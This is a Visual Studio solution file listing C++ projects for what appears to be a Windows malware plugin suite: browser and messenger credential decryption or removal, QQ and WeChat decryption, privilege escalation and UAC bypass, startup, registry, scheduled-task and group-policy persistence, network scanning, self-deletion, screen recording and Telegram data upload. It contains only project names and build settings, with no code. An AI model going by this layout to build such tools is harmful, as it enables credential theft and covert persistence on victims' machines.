
Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.33328.57
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "解密数据", "解密数据\解密数据\解密数据.vcxproj", "{5B529111-A63F-4B86-9594-EE8C43E11B5A}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "删除自身", "删除自身\删除自身\删除自身.vcxproj", "{84E95506-C4A0-4A48-BDA1-1A5D3B905CB4}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "删除360急速安全账号密码", "删除360急速安全账号密码\plug\删除360急速安全账号密码.vcxproj", "{E63F0445-C752-4826-BAA0-A46BA359BDD2}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "删除chrome账号密码", "删除chrome账号密码\plug\删除chrome账号密码.vcxproj", "{5D9DE4DF-E899-42FF-A25A-4608DA1FE4E9}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "删除ie账号密码", "删除ie账号密码\plug\删除ie账号密码.vcxproj", "{4C6AFC56-EC57-47B7-B62F-CD391085DDEC}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "删除qq账号密码", "删除qq账号密码\plug\删除qq账号密码.vcxproj", "{4DD26289-30A8-4D01-AE27-3367EDE71535}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "删除skype账号密码", "删除skype账号密码\plug\删除skype账号密码.vcxproj", "{50E8F061-89E2-40D1-925B-C541B95C5526}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "删除sogou账号密码", "删除sogou账号密码\plug\删除sogou账号密码.vcxproj", "{9FF0A372-4DED-43C1-8ECC-0C433152D997}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "删除telegram账号密码", "删除telegram账号密码\plug\删除telegram账号密码.vcxproj", "{ECFA1905-3813-4FD4-8EAA-B70E940BBE45}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "提权-CreateProcessInSession0", "提权-CreateProcessInSession0\plug\提权-CreateProcessInSession0.vcxproj", "{F1D4E7BF-DA15-45CF-B012-945C37145B2D}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "提权-EnableDebugPrivilege", "提权-EnableDebugPrivilege\plug\提权-EnableDebugPrivilege.vcxproj", "{587B0F1C-EFED-4A23-8492-641CB9AD944C}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "提权-RtlAdjustPrivilege", "提权-RtlAdjustPrivilege\plug\提权-RtlAdjustPrivilege.vcxproj", "{F20F8E40-7AF4-4299-908A-EDE2E1973B14}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "提权ShellExecuteEx", "提权ShellExecuteEx\plug\提权ShellExecuteEx.vcxproj", "{F1FFDAA2-DBF0-4F6D-AD91-ADBFFA1E41E2}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "写启动目录", "写启动目录\plug\写启动目录.vcxproj", "{EF4335E7-D9A6-4B01-B011-16886E18952D}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "写注册表启动", "写注册表启动\plug\写注册表启动.vcxproj", "{DFA02D21-7A4C-4DCC-8F6C-082688D3B017}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "内网主机扫描", "内网主机扫描\内网主机扫描\内网主机扫描.vcxproj", "{34C2D0A5-CE58-488B-8789-7A8EB5785A05}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "企鹅解密", "企鹅解密\企鹅解密\企鹅解密.vcxproj", "{A531548A-159F-4D15-A6C3-061185D10A77}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "微信解密", "微信解密\微信解密\微信解密.vcxproj", "{D37A2325-B9EC-4685-BDF5-BBDB44E9DB9D}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "体积膨胀", "体积膨胀\体积膨胀\体积膨胀.vcxproj", "{4C85DC88-54B0-4BF9-9110-5889398BF661}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "写计划任务", "计划任务\plug\计划任务.vcxproj", "{F1086A6A-6629-43C1-BA21-9DF06A03FE18}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "测试", "测试\测试\测试.vcxproj", "{D8D563AC-3E35-4CE7-B951-EC9126766293}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "桌面录制", "桌面录制\桌面录制\桌面录制.vcxproj", "{D62777AD-F7A7-4532-AC53-5C6E54E9FA26}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "telegram自动打包", "telegram自动打包\telegram自动打包\telegram自动打包.vcxproj", "{9BBE4E97-3449-4FA0-8DFF-6B50074086D1}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "telegram打包上传", "telegram打包上传\telegram打包上传\telegram打包上传.vcxproj", "{9FC77B53-D4D9-4DCC-B31D-B425C484B559}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "高级浏览器解密", "高级浏览器解密\高级浏览器解密\高级浏览器解密.vcxproj", "{A0F6DB24-5006-4BB7-A1EC-3F776E8E97F0}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "UACME", "UACME\UACME\UACME.vcxproj", "{5FCADF4F-B11D-4536-979F-8170F7F4F8D8}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "本地组策略添加启动", "本地组策略添加启动\本地组策略添加启动\本地组策略添加启动.vcxproj", "{F53A13AE-B21F-4C07-8D49-FC7E5220C6F1}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Win32 = Debug|Win32
		Debug|x64 = Debug|x64
		Release|Win32 = Release|Win32
		Release|x64 = Release|x64
		Release-exe|Win32 = Release-exe|Win32
		Release-exe|x64 = Release-exe|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{5B529111-A63F-4B86-9594-EE8C43E11B5A}.Debug|Win32.ActiveCfg = Debug|Win32
		{5B529111-A63F-4B86-9594-EE8C43E11B5A}.Debug|Win32.Build.0 = Debug|Win32
		{5B529111-A63F-4B86-9594-EE8C43E11B5A}.Debug|x64.ActiveCfg = Debug|x64
		{5B529111-A63F-4B86-9594-EE8C43E11B5A}.Debug|x64.Build.0 = Debug|x64
		{5B529111-A63F-4B86-9594-EE8C43E11B5A}.Release|Win32.ActiveCfg = Release|Win32
		{5B529111-A63F-4B86-9594-EE8C43E11B5A}.Release|Win32.Build.0 = Release|Win32
		{5B529111-A63F-4B86-9594-EE8C43E11B5A}.Release|x64.ActiveCfg = Release|x64
		{5B529111-A63F-4B86-9594-EE8C43E11B5A}.Release|x64.Build.0 = Release|x64
		{5B529111-A63F-4B86-9594-EE8C43E11B5A}.Release-exe|Win32.ActiveCfg = Release-exe|Win32
		{5B529111-A63F-4B86-9594-EE8C43E11B5A}.Release-exe|Win32.Build.0 = Release-exe|Win32
		{5B529111-A63F-4B86-9594-EE8C43E11B5A}.Release-exe|x64.ActiveCfg = Release-exe|x64
		{5B529111-A63F-4B86-9594-EE8C43E11B5A}.Release-exe|x64.Build.0 = Release-exe|x64
		{84E95506-C4A0-4A48-BDA1-1A5D3B905CB4}.Debug|Win32.ActiveCfg = Debug|Win32
		{84E95506-C4A0-4A48-BDA1-1A5D3B905CB4}.Debug|Win32.Build.0 = Debug|Win32
		{84E95506-C4A0-4A48-BDA1-1A5D3B905CB4}.Debug|x64.ActiveCfg = Debug|x64
		{84E95506-C4A0-4A48-BDA1-1A5D3B905CB4}.Debug|x64.Build.0 = Debug|x64
		{84E95506-C4A0-4A48-BDA1-1A5D3B905CB4}.Release|Win32.ActiveCfg = Release|Win32
		{84E95506-C4A0-4A48-BDA1-1A5D3B905CB4}.Release|Win32.Build.0 = Release|Win32
		{84E95506-C4A0-4A48-BDA1-1A5D3B905CB4}.Release|x64.ActiveCfg = Release|x64
		{84E95506-C4A0-4A48-BDA1-1A5D3B905CB4}.Release|x64.Build.0 = Release|x64
		{84E95506-C4A0-4A48-BDA1-1A5D3B905CB4}.Release-exe|Win32.ActiveCfg = Release|Win32
		{84E95506-C4A0-4A48-BDA1-1A5D3B905CB4}.Release-exe|Win32.Build.0 = Release|Win32
		{84E95506-C4A0-4A48-BDA1-1A5D3B905CB4}.Release-exe|x64.ActiveCfg = Release|x64
		{84E95506-C4A0-4A48-BDA1-1A5D3B905CB4}.Release-exe|x64.Build.0 = Release|x64
		{E63F0445-C752-4826-BAA0-A46BA359BDD2}.Debug|Win32.ActiveCfg = Debug|Win32
		{E63F0445-C752-4826-BAA0-A46BA359BDD2}.Debug|Win32.Build.0 = Debug|Win32
		{E63F0445-C752-4826-BAA0-A46BA359BDD2}.Debug|x64.ActiveCfg = Debug|x64
		{E63F0445-C752-4826-BAA0-A46BA359BDD2}.Debug|x64.Build.0 = Debug|x64
		{E63F0445-C752-4826-BAA0-A46BA359BDD2}.Release|Win32.ActiveCfg = Release|Win32
		{E63F0445-C752-4826-BAA0-A46BA359BDD2}.Release|Win32.Build.0 = Release|Win32
		{E63F0445-C752-4826-BAA0-A46BA359BDD2}.Release|x64.ActiveCfg = Release|x64
		{E63F0445-C752-4826-BAA0-A46BA359BDD2}.Release|x64.Build.0 = Release|x64
		{E63F0445-C752-4826-BAA0-A46BA359BDD2}.Release-exe|Win32.ActiveCfg = Release|Win32
		{E63F0445-C752-4826-BAA0-A46BA359BDD2}.Release-exe|Win32.Build.0 = Release|Win32
		{E63F0445-C752-4826-BAA0-A46BA359BDD2}.Release-exe|x64.ActiveCfg = Release|x64
		{E63F0445-C752-4826-BAA0-A46BA359BDD2}.Release-exe|x64.Build.0 = Release|x64
		{5D9DE4DF-E899-42FF-A25A-4608DA1FE4E9}.Debug|Win32.ActiveCfg = Debug|Win32
		{5D9DE4DF-E899-42FF-A25A-4608DA1FE4E9}.Debug|Win32.Build.0 = Debug|Win32
		{5D9DE4DF-E899-42FF-A25A-4608DA1FE4E9}.Debug|x64.ActiveCfg = Debug|x64
		{5D9DE4DF-E899-42FF-A25A-4608DA1FE4E9}.Debug|x64.Build.0 = Debug|x64
		{5D9DE4DF-E899-42FF-A25A-4608DA1FE4E9}.Release|Win32.ActiveCfg = Release|Win32
		{5D9DE4DF-E899-42FF-A25A-4608DA1FE4E9}.Release|Win32.Build.0 = Release|Win32
		{5D9DE4DF-E899-42FF-A25A-4608DA1FE4E9}.Release|x64.ActiveCfg = Release|x64
		{5D9DE4DF-E899-42FF-A25A-4608DA1FE4E9}.Release|x64.Build.0 = Release|x64
		{5D9DE4DF-E899-42FF-A25A-4608DA1FE4E9}.Release-exe|Win32.ActiveCfg = Release|Win32
		{5D9DE4DF-E899-42FF-A25A-4608DA1FE4E9}.Release-exe|Win32.Build.0 = Release|Win32
		{5D9DE4DF-E899-42FF-A25A-4608DA1FE4E9}.Release-exe|x64.ActiveCfg = Release|x64
		{5D9DE4DF-E899-42FF-A25A-4608DA1FE4E9}.Release-exe|x64.Build.0 = Release|x64
		{4C6AFC56-EC57-47B7-B62F-CD391085DDEC}.Debug|Win32.ActiveCfg = Debug|Win32
		{4C6AFC56-EC57-47B7-B62F-CD391085DDEC}.Debug|Win32.Build.0 = Debug|Win32
		{4C6AFC56-EC57-47B7-B62F-CD391085DDEC}.Debug|x64.ActiveCfg = Debug|x64
		{4C6AFC56-EC57-47B7-B62F-CD391085DDEC}.Debug|x64.Build.0 = Debug|x64
		{4C6AFC56-EC57-47B7-B62F-CD391085DDEC}.Release|Win32.ActiveCfg = Release|Win32
		{4C6AFC56-EC57-47B7-B62F-CD391085DDEC}.Release|Win32.Build.0 = Release|Win32
		{4C6AFC56-EC57-47B7-B62F-CD391085DDEC}.Release|x64.ActiveCfg = Release|x64
		{4C6AFC56-EC57-47B7-B62F-CD391085DDEC}.Release|x64.Build.0 = Release|x64
		{4C6AFC56-EC57-47B7-B62F-CD391085DDEC}.Release-exe|Win32.ActiveCfg = Release|Win32
		{4C6AFC56-EC57-47B7-B62F-CD391085DDEC}.Release-exe|Win32.Build.0 = Release|Win32
		{4C6AFC56-EC57-47B7-B62F-CD391085DDEC}.Release-exe|x64.ActiveCfg = Release|x64
		{4C6AFC56-EC57-47B7-B62F-CD391085DDEC}.Release-exe|x64.Build.0 = Release|x64
		{4DD26289-30A8-4D01-AE27-3367EDE71535}.Debug|Win32.ActiveCfg = Debug|Win32
		{4DD26289-30A8-4D01-AE27-3367EDE71535}.Debug|Win32.Build.0 = Debug|Win32
		{4DD26289-30A8-4D01-AE27-3367EDE71535}.Debug|x64.ActiveCfg = Debug|x64
		{4DD26289-30A8-4D01-AE27-3367EDE71535}.Debug|x64.Build.0 = Debug|x64
		{4DD26289-30A8-4D01-AE27-3367EDE71535}.Release|Win32.ActiveCfg = Release|Win32
		{4DD26289-30A8-4D01-AE27-3367EDE71535}.Release|Win32.Build.0 = Release|Win32
		{4DD26289-30A8-4D01-AE27-3367EDE71535}.Release|x64.ActiveCfg = Release|x64
		{4DD26289-30A8-4D01-AE27-3367EDE71535}.Release|x64.Build.0 = Release|x64
		{4DD26289-30A8-4D01-AE27-3367EDE71535}.Release-exe|Win32.ActiveCfg = Release|Win32
		{4DD26289-30A8-4D01-AE27-3367EDE71535}.Release-exe|Win32.Build.0 = Release|Win32
		{4DD26289-30A8-4D01-AE27-3367EDE71535}.Release-exe|x64.ActiveCfg = Release|x64
		{4DD26289-30A8-4D01-AE27-3367EDE71535}.Release-exe|x64.Build.0 = Release|x64
		{50E8F061-89E2-40D1-925B-C541B95C5526}.Debug|Win32.ActiveCfg = Debug|Win32
		{50E8F061-89E2-40D1-925B-C541B95C5526}.Debug|Win32.Build.0 = Debug|Win32
		{50E8F061-89E2-40D1-925B-C541B95C5526}.Debug|x64.ActiveCfg = Debug|x64
		{50E8F061-89E2-40D1-925B-C541B95C5526}.Debug|x64.Build.0 = Debug|x64
		{50E8F061-89E2-40D1-925B-C541B95C5526}.Release|Win32.ActiveCfg = Release|Win32
		{50E8F061-89E2-40D1-925B-C541B95C5526}.Release|Win32.Build.0 = Release|Win32
		{50E8F061-89E2-40D1-925B-C541B95C5526}.Release|x64.ActiveCfg = Release|x64
		{50E8F061-89E2-40D1-925B-C541B95C5526}.Release|x64.Build.0 = Release|x64
		{50E8F061-89E2-40D1-925B-C541B95C5526}.Release-exe|Win32.ActiveCfg = Release|Win32
		{50E8F061-89E2-40D1-925B-C541B95C5526}.Release-exe|Win32.Build.0 = Release|Win32
		{50E8F061-89E2-40D1-925B-C541B95C5526}.Release-exe|x64.ActiveCfg = Release|x64
		{50E8F061-89E2-40D1-925B-C541B95C5526}.Release-exe|x64.Build.0 = Release|x64
		{9FF0A372-4DED-43C1-8ECC-0C433152D997}.Debug|Win32.ActiveCfg = Debug|Win32
		{9FF0A372-4DED-43C1-8ECC-0C433152D997}.Debug|Win32.Build.0 = Debug|Win32
		{9FF0A372-4DED-43C1-8ECC-0C433152D997}.Debug|x64.ActiveCfg = Debug|x64
		{9FF0A372-4DED-43C1-8ECC-0C433152D997}.Debug|x64.Build.0 = Debug|x64
		{9FF0A372-4DED-43C1-8ECC-0C433152D997}.Release|Win32.ActiveCfg = Release|Win32
		{9FF0A372-4DED-43C1-8ECC-0C433152D997}.Release|Win32.Build.0 = Release|Win32
		{9FF0A372-4DED-43C1-8ECC-0C433152D997}.Release|x64.ActiveCfg = Release|x64
		{9FF0A372-4DED-43C1-8ECC-0C433152D997}.Release|x64.Build.0 = Release|x64
		{9FF0A372-4DED-43C1-8ECC-0C433152D997}.Release-exe|Win32.ActiveCfg = Release|Win32
		{9FF0A372-4DED-43C1-8ECC-0C433152D997}.Release-exe|Win32.Build.0 = Release|Win32
		{9FF0A372-4DED-43C1-8ECC-0C433152D997}.Release-exe|x64.ActiveCfg = Release|x64
		{9FF0A372-4DED-43C1-8ECC-0C433152D997}.Release-exe|x64.Build.0 = Release|x64
		{ECFA1905-3813-4FD4-8EAA-B70E940BBE45}.Debug|Win32.ActiveCfg = Debug|Win32
		{ECFA1905-3813-4FD4-8EAA-B70E940BBE45}.Debug|Win32.Build.0 = Debug|Win32
		{ECFA1905-3813-4FD4-8EAA-B70E940BBE45}.Debug|x64.ActiveCfg = Debug|x64
		{ECFA1905-3813-4FD4-8EAA-B70E940BBE45}.Debug|x64.Build.0 = Debug|x64
		{ECFA1905-3813-4FD4-8EAA-B70E940BBE45}.Release|Win32.ActiveCfg = Release|Win32
		{ECFA1905-3813-4FD4-8EAA-B70E940BBE45}.Release|Win32.Build.0 = Release|Win32
		{ECFA1905-3813-4FD4-8EAA-B70E940BBE45}.Release|x64.ActiveCfg = Release|x64
		{ECFA1905-3813-4FD4-8EAA-B70E940BBE45}.Release|x64.Build.0 = Release|x64
		{ECFA1905-3813-4FD4-8EAA-B70E940BBE45}.Release-exe|Win32.ActiveCfg = Release|Win32
		{ECFA1905-3813-4FD4-8EAA-B70E940BBE45}.Release-exe|Win32.Build.0 = Release|Win32
		{ECFA1905-3813-4FD4-8EAA-B70E940BBE45}.Release-exe|x64.ActiveCfg = Release|x64
		{ECFA1905-3813-4FD4-8EAA-B70E940BBE45}.Release-exe|x64.Build.0 = Release|x64
		{F1D4E7BF-DA15-45CF-B012-945C37145B2D}.Debug|Win32.ActiveCfg = Debug|Win32
		{F1D4E7BF-DA15-45CF-B012-945C37145B2D}.Debug|Win32.Build.0 = Debug|Win32
		{F1D4E7BF-DA15-45CF-B012-945C37145B2D}.Debug|x64.ActiveCfg = Debug|x64
		{F1D4E7BF-DA15-45CF-B012-945C37145B2D}.Debug|x64.Build.0 = Debug|x64
		{F1D4E7BF-DA15-45CF-B012-945C37145B2D}.Release|Win32.ActiveCfg = Release|Win32
		{F1D4E7BF-DA15-45CF-B012-945C37145B2D}.Release|Win32.Build.0 = Release|Win32
		{F1D4E7BF-DA15-45CF-B012-945C37145B2D}.Release|x64.ActiveCfg = Release|x64
		{F1D4E7BF-DA15-45CF-B012-945C37145B2D}.Release|x64.Build.0 = Release|x64
		{F1D4E7BF-DA15-45CF-B012-945C37145B2D}.Release-exe|Win32.ActiveCfg = Release|Win32
		{F1D4E7BF-DA15-45CF-B012-945C37145B2D}.Release-exe|Win32.Build.0 = Release|Win32
		{F1D4E7BF-DA15-45CF-B012-945C37145B2D}.Release-exe|x64.ActiveCfg = Release|x64
		{F1D4E7BF-DA15-45CF-B012-945C37145B2D}.Release-exe|x64.Build.0 = Release|x64
		{587B0F1C-EFED-4A23-8492-641CB9AD944C}.Debug|Win32.ActiveCfg = Debug|Win32
		{587B0F1C-EFED-4A23-8492-641CB9AD944C}.Debug|Win32.Build.0 = Debug|Win32
		{587B0F1C-EFED-4A23-8492-641CB9AD944C}.Debug|x64.ActiveCfg = Debug|x64
		{587B0F1C-EFED-4A23-8492-641CB9AD944C}.Debug|x64.Build.0 = Debug|x64
		{587B0F1C-EFED-4A23-8492-641CB9AD944C}.Release|Win32.ActiveCfg = Release|Win32
		{587B0F1C-EFED-4A23-8492-641CB9AD944C}.Release|Win32.Build.0 = Release|Win32
		{587B0F1C-EFED-4A23-8492-641CB9AD944C}.Release|x64.ActiveCfg = Release|x64
		{587B0F1C-EFED-4A23-8492-641CB9AD944C}.Release|x64.Build.0 = Release|x64
		{587B0F1C-EFED-4A23-8492-641CB9AD944C}.Release-exe|Win32.ActiveCfg = Release|Win32
		{587B0F1C-EFED-4A23-8492-641CB9AD944C}.Release-exe|Win32.Build.0 = Release|Win32
		{587B0F1C-EFED-4A23-8492-641CB9AD944C}.Release-exe|x64.ActiveCfg = Release|x64
		{587B0F1C-EFED-4A23-8492-641CB9AD944C}.Release-exe|x64.Build.0 = Release|x64
		{F20F8E40-7AF4-4299-908A-EDE2E1973B14}.Debug|Win32.ActiveCfg = Debug|Win32
		{F20F8E40-7AF4-4299-908A-EDE2E1973B14}.Debug|Win32.Build.0 = Debug|Win32
		{F20F8E40-7AF4-4299-908A-EDE2E1973B14}.Debug|x64.ActiveCfg = Debug|x64
		{F20F8E40-7AF4-4299-908A-EDE2E1973B14}.Debug|x64.Build.0 = Debug|x64
		{F20F8E40-7AF4-4299-908A-EDE2E1973B14}.Release|Win32.ActiveCfg = Release|Win32
		{F20F8E40-7AF4-4299-908A-EDE2E1973B14}.Release|Win32.Build.0 = Release|Win32
		{F20F8E40-7AF4-4299-908A-EDE2E1973B14}.Release|x64.ActiveCfg = Release|x64
		{F20F8E40-7AF4-4299-908A-EDE2E1973B14}.Release|x64.Build.0 = Release|x64
		{F20F8E40-7AF4-4299-908A-EDE2E1973B14}.Release-exe|Win32.ActiveCfg = Release|Win32
		{F20F8E40-7AF4-4299-908A-EDE2E1973B14}.Release-exe|Win32.Build.0 = Release|Win32
		{F20F8E40-7AF4-4299-908A-EDE2E1973B14}.Release-exe|x64.ActiveCfg = Release|x64
		{F20F8E40-7AF4-4299-908A-EDE2E1973B14}.Release-exe|x64.Build.0 = Release|x64
		{F1FFDAA2-DBF0-4F6D-AD91-ADBFFA1E41E2}.Debug|Win32.ActiveCfg = Debug|Win32
		{F1FFDAA2-DBF0-4F6D-AD91-ADBFFA1E41E2}.Debug|Win32.Build.0 = Debug|Win32
		{F1FFDAA2-DBF0-4F6D-AD91-ADBFFA1E41E2}.Debug|x64.ActiveCfg = Debug|x64
		{F1FFDAA2-DBF0-4F6D-AD91-ADBFFA1E41E2}.Debug|x64.Build.0 = Debug|x64
		{F1FFDAA2-DBF0-4F6D-AD91-ADBFFA1E41E2}.Release|Win32.ActiveCfg = Release|Win32
		{F1FFDAA2-DBF0-4F6D-AD91-ADBFFA1E41E2}.Release|Win32.Build.0 = Release|Win32
		{F1FFDAA2-DBF0-4F6D-AD91-ADBFFA1E41E2}.Release|x64.ActiveCfg = Release|x64
		{F1FFDAA2-DBF0-4F6D-AD91-ADBFFA1E41E2}.Release|x64.Build.0 = Release|x64
		{F1FFDAA2-DBF0-4F6D-AD91-ADBFFA1E41E2}.Release-exe|Win32.ActiveCfg = Release|Win32
		{F1FFDAA2-DBF0-4F6D-AD91-ADBFFA1E41E2}.Release-exe|Win32.Build.0 = Release|Win32
		{F1FFDAA2-DBF0-4F6D-AD91-ADBFFA1E41E2}.Release-exe|x64.ActiveCfg = Release|x64
		{F1FFDAA2-DBF0-4F6D-AD91-ADBFFA1E41E2}.Release-exe|x64.Build.0 = Release|x64
		{EF4335E7-D9A6-4B01-B011-16886E18952D}.Debug|Win32.ActiveCfg = Debug|Win32
		{EF4335E7-D9A6-4B01-B011-16886E18952D}.Debug|Win32.Build.0 = Debug|Win32
		{EF4335E7-D9A6-4B01-B011-16886E18952D}.Debug|x64.ActiveCfg = Debug|x64
		{EF4335E7-D9A6-4B01-B011-16886E18952D}.Debug|x64.Build.0 = Debug|x64
		{EF4335E7-D9A6-4B01-B011-16886E18952D}.Release|Win32.ActiveCfg = Release|Win32
		{EF4335E7-D9A6-4B01-B011-16886E18952D}.Release|Win32.Build.0 = Release|Win32
		{EF4335E7-D9A6-4B01-B011-16886E18952D}.Release|x64.ActiveCfg = Release|x64
		{EF4335E7-D9A6-4B01-B011-16886E18952D}.Release|x64.Build.0 = Release|x64
		{EF4335E7-D9A6-4B01-B011-16886E18952D}.Release-exe|Win32.ActiveCfg = Release|Win32
		{EF4335E7-D9A6-4B01-B011-16886E18952D}.Release-exe|Win32.Build.0 = Release|Win32
		{EF4335E7-D9A6-4B01-B011-16886E18952D}.Release-exe|x64.ActiveCfg = Release|x64
		{EF4335E7-D9A6-4B01-B011-16886E18952D}.Release-exe|x64.Build.0 = Release|x64
		{DFA02D21-7A4C-4DCC-8F6C-082688D3B017}.Debug|Win32.ActiveCfg = Debug|Win32
		{DFA02D21-7A4C-4DCC-8F6C-082688D3B017}.Debug|Win32.Build.0 = Debug|Win32
		{DFA02D21-7A4C-4DCC-8F6C-082688D3B017}.Debug|x64.ActiveCfg = Debug|x64
		{DFA02D21-7A4C-4DCC-8F6C-082688D3B017}.Debug|x64.Build.0 = Debug|x64
		{DFA02D21-7A4C-4DCC-8F6C-082688D3B017}.Release|Win32.ActiveCfg = Release|Win32
		{DFA02D21-7A4C-4DCC-8F6C-082688D3B017}.Release|Win32.Build.0 = Release|Win32
		{DFA02D21-7A4C-4DCC-8F6C-082688D3B017}.Release|x64.ActiveCfg = Release|x64
		{DFA02D21-7A4C-4DCC-8F6C-082688D3B017}.Release|x64.Build.0 = Release|x64
		{DFA02D21-7A4C-4DCC-8F6C-082688D3B017}.Release-exe|Win32.ActiveCfg = Release|Win32
		{DFA02D21-7A4C-4DCC-8F6C-082688D3B017}.Release-exe|Win32.Build.0 = Release|Win32
		{DFA02D21-7A4C-4DCC-8F6C-082688D3B017}.Release-exe|x64.ActiveCfg = Release|x64
		{DFA02D21-7A4C-4DCC-8F6C-082688D3B017}.Release-exe|x64.Build.0 = Release|x64
		{34C2D0A5-CE58-488B-8789-7A8EB5785A05}.Debug|Win32.ActiveCfg = Debug|Win32
		{34C2D0A5-CE58-488B-8789-7A8EB5785A05}.Debug|Win32.Build.0 = Debug|Win32
		{34C2D0A5-CE58-488B-8789-7A8EB5785A05}.Debug|x64.ActiveCfg = Debug|x64
		{34C2D0A5-CE58-488B-8789-7A8EB5785A05}.Debug|x64.Build.0 = Debug|x64
		{34C2D0A5-CE58-488B-8789-7A8EB5785A05}.Release|Win32.ActiveCfg = Release|Win32
		{34C2D0A5-CE58-488B-8789-7A8EB5785A05}.Release|Win32.Build.0 = Release|Win32
		{34C2D0A5-CE58-488B-8789-7A8EB5785A05}.Release|x64.ActiveCfg = Release|x64
		{34C2D0A5-CE58-488B-8789-7A8EB5785A05}.Release|x64.Build.0 = Release|x64
		{34C2D0A5-CE58-488B-8789-7A8EB5785A05}.Release-exe|Win32.ActiveCfg = Release-exe|Win32
		{34C2D0A5-CE58-488B-8789-7A8EB5785A05}.Release-exe|Win32.Build.0 = Release-exe|Win32
		{34C2D0A5-CE58-488B-8789-7A8EB5785A05}.Release-exe|x64.ActiveCfg = Release-exe|x64
		{34C2D0A5-CE58-488B-8789-7A8EB5785A05}.Release-exe|x64.Build.0 = Release-exe|x64
		{A531548A-159F-4D15-A6C3-061185D10A77}.Debug|Win32.ActiveCfg = Debug|Win32
		{A531548A-159F-4D15-A6C3-061185D10A77}.Debug|Win32.Build.0 = Debug|Win32
		{A531548A-159F-4D15-A6C3-061185D10A77}.Debug|x64.ActiveCfg = Debug|x64
		{A531548A-159F-4D15-A6C3-061185D10A77}.Debug|x64.Build.0 = Debug|x64
		{A531548A-159F-4D15-A6C3-061185D10A77}.Release|Win32.ActiveCfg = Release|Win32
		{A531548A-159F-4D15-A6C3-061185D10A77}.Release|Win32.Build.0 = Release|Win32
		{A531548A-159F-4D15-A6C3-061185D10A77}.Release|x64.ActiveCfg = Release|x64
		{A531548A-159F-4D15-A6C3-061185D10A77}.Release|x64.Build.0 = Release|x64
		{A531548A-159F-4D15-A6C3-061185D10A77}.Release-exe|Win32.ActiveCfg = Release-exe|Win32
		{A531548A-159F-4D15-A6C3-061185D10A77}.Release-exe|Win32.Build.0 = Release-exe|Win32
		{A531548A-159F-4D15-A6C3-061185D10A77}.Release-exe|x64.ActiveCfg = Release-exe|x64
		{A531548A-159F-4D15-A6C3-061185D10A77}.Release-exe|x64.Build.0 = Release-exe|x64
		{D37A2325-B9EC-4685-BDF5-BBDB44E9DB9D}.Debug|Win32.ActiveCfg = Debug|Win32
		{D37A2325-B9EC-4685-BDF5-BBDB44E9DB9D}.Debug|Win32.Build.0 = Debug|Win32
		{D37A2325-B9EC-4685-BDF5-BBDB44E9DB9D}.Debug|x64.ActiveCfg = Debug|x64
		{D37A2325-B9EC-4685-BDF5-BBDB44E9DB9D}.Debug|x64.Build.0 = Debug|x64
		{D37A2325-B9EC-4685-BDF5-BBDB44E9DB9D}.Release|Win32.ActiveCfg = Release|Win32
		{D37A2325-B9EC-4685-BDF5-BBDB44E9DB9D}.Release|Win32.Build.0 = Release|Win32
		{D37A2325-B9EC-4685-BDF5-BBDB44E9DB9D}.Release|x64.ActiveCfg = Release|x64
		{D37A2325-B9EC-4685-BDF5-BBDB44E9DB9D}.Release|x64.Build.0 = Release|x64
		{D37A2325-B9EC-4685-BDF5-BBDB44E9DB9D}.Release-exe|Win32.ActiveCfg = Release-exe|Win32
		{D37A2325-B9EC-4685-BDF5-BBDB44E9DB9D}.Release-exe|Win32.Build.0 = Release-exe|Win32
		{D37A2325-B9EC-4685-BDF5-BBDB44E9DB9D}.Release-exe|x64.ActiveCfg = Release-exe|x64
		{D37A2325-B9EC-4685-BDF5-BBDB44E9DB9D}.Release-exe|x64.Build.0 = Release-exe|x64
		{4C85DC88-54B0-4BF9-9110-5889398BF661}.Debug|Win32.ActiveCfg = Debug|Win32
		{4C85DC88-54B0-4BF9-9110-5889398BF661}.Debug|Win32.Build.0 = Debug|Win32
		{4C85DC88-54B0-4BF9-9110-5889398BF661}.Debug|x64.ActiveCfg = Debug|x64
		{4C85DC88-54B0-4BF9-9110-5889398BF661}.Debug|x64.Build.0 = Debug|x64
